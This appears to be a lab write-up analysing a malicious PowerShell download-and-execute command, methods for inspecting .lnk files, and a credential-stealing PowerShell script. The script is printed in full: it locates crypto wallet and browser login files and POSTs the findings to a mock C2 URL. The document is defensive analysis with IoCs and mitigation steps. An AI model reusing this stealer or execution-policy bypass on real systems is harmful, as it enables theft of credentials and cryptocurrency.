**Command used in PowerShell**

`-ep Bypass` 

**Explanation:** Overrides PowerShell’s excution policy to allow the script to run regardless of the machine’s policy settings

**Purpose**: ****Execution policies are a security measure to restrict script execution. This bypass ensures the script runs without interference

`-nop` 

**Explanation:** Disables PowerShell’s profile loading

**Purpose:** Allows inline execution of PowerShell commands

`(New-Object Net.WebClient).DownloadFile(...)` 

**Explanation:** Uses the `.NET` `WebClient` object to download a file from a specified URL

**Purpose:** Fetches the script `(IS.ps1)` from the remote server hosted on GitHub

``C:\ProgramData\s.ps1`` 

**Explanation:** Specifies the location on the local system where the downloaded file will be saved

**Purpose**: ****Ensures the downloaded script is stored in a predictable location for subsequent execution

`iex (Get-Content ... -Raw)` 

**Explanation:** Reads the content of the downloaded file (`s.ps1`) and passes it to `Invoke-Expression (iex)` to execute it in memory

**Purpose:** Executes the script directly, making it harder for traditional security tools to detect

**Potential Uses**

Legitimate Usage: Automating administrative tasks or downloading scripts for deployment

Malicious Usage: Malware and phishing attacks to execute malicious scripts stealthily

**Mitigation and Analysis**

If this command observed in logs or detected by security tools:

1. **Investigate Source URL**: to understand what the file contains
2. **Check System Logs:** Review logs for similar activity or further signs of compromise
3. **Quarantine the Script:** Inspect the file in an isolated environment
4. **Restrict Execution:** Enforce strict execution in PowerShell. Monitor and block potentially harmful PowerShell commands using endpoint security solutions






Multiple ways to inspect .lnk file to reveal embedded commands and attributes

To view the content of a `.lnk` (shortcut) file, you can use several methods. Here are a few options:

**1. Using a Text Editor**

You can open the `.lnk` file in a text editor (like Notepad) to see some of the raw data. However, the content will be mostly unreadable, as `.lnk` files are binary files. You can still see some text strings, such as the target path.

**2. Using Windows Explorer**

1. **Right-click** on the shortcut file.
2. Select **Properties**.
3. In the **Shortcut** tab, you will see the **Target** field, which shows the path the shortcut points to, along with other information such as Start in and Shortcut key.

**3. Using Command Prompt**

You can use the built-in command line tool `WMI` to extract details from the `.lnk` file:1. Open Command Prompt.2. Run the following command:
`1. bash 
2.    wmic path Win32_ShortcutFile where "Name='your_shortcut.lnk'" get Target`

Replace `your_shortcut.lnk` with the actual name of your shortcut file.

**4. Using a Third-Party Tool**

There are several tools designed to analyze `.lnk` files and display their contents in a user-friendly way:- **LnkParser**: A specialized tool for viewing shortcut files.- **Shortcut Explorer**: Another tool that provides detailed information about shortcuts.

**5. Using PowerShell**

You can also use PowerShell to get detailed information:
`1. $shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut("C:\path\to\your_shortcut.lnk") 
2. $shortcut.TargetPath 
3. $shortcut.Arguments 
4. $shortcut.WorkingDirectory`

These methods should help you view the content and properties of a `.lnk` file.

More readings: https://belkasoft.com/forensic-analysis-of-lnk-files







```jsx
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

# Function to search for browser credential files (SQLite databases)
function Search-ForBrowserCredentials {
    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"

    Add-Content -Path $infoFilePath -Value "`n### Browser Credential Files ###"
    if (Test-Path $chromePath) {
        Add-Content -Path $infoFilePath -Value "Found Chrome credentials: $chromePath"
    }
    if (Test-Path $firefoxPath) {
        Add-Content -Path $infoFilePath -Value "Found Firefox credentials: $firefoxPath"
    }
}

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://papash3ll.thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

# Main execution flow
Search-ForWallets
Search-ForBrowserCredentials
Send-InfoToC2Server
```

**Script breakdown**

1. Search-For-Wallets Function
    1. Paths searched:
        1. Bitcoin (`wallet.dat`)
        2. Ethereum (`keystore`)
        3. Monero (`wallet`)
        4. Dogecoin (`wallet.dat`)
    2. Actions
        1. Use `Test-Path` to check for existence of files
        2. Appends paths of found wallet files to `stolen_info.txt`
2. Search-For-BrowserCredentials Function 
    1. Target credential files from web browsers
        1. Google Chrome (`Login Data` SQLite database)
        2. Firefox (`logins.json`)
    2. Actions
        1. Uses `Test-Path` to check for the existence of files
        2. Appends file paths into stolen_info.txt
3. Send-InfoToC2Server Function
    1. C2 URL: http://papash311.thm/data
    2. Method: HTTP POST request
    3. Data: Contents of `stolen_info.txt`
4. Execution Flow
    1. `Search-ForWallets` to locate cryptocurrency wallet files
    2. `Search-ForBrowserCredentials` to identify browser credential files
    3. `Send-InfoToC2Server` to exfiltrate gathered information

**Observations** 

Malicious intent - explicitly designed to steal cryptocurrency wallet files and browser credentials, then exfiltrate this information to a remote server

Indicators of Compromise (IoCs)

- File path: stolen_info.txt
- C2 URL
- Specific file paths for wallets and credentials

Methods used:

- `Test-Path` for identify files
- `Add-Content` for appending data to a file
- `Invoke-WebRequest` for sending data to C2 server

### Mitigation and Response

1. **Preventive Measures**:
    - Restrict PowerShell execution policies to prevent script execution.
    - Use endpoint protection to detect and block malicious scripts.
2. **Incident Response**:
    - **Containment**:
        - Terminate the process executing this script.
        - Quarantine the affected machine.
    - **Eradication**:
        - Remove the `stolen_info.txt` file if present.
        - Search for and remove other traces of the script.
    - **Recovery**:
        - Change credentials stored in the affected browsers.
        - Move or secure any cryptocurrency wallets.
    - **Analysis**:
        - Check logs for outbound connections to `http://papash3ll.thm/data`.
        - Determine if data was successfully exfiltrated.
3. **Detection**:
    - Monitor for use of PowerShell with suspicious commands (e.g., `Invoke-WebRequest` to unknown domains).
    - Detect unusual file access patterns for sensitive paths (wallets or credential files).
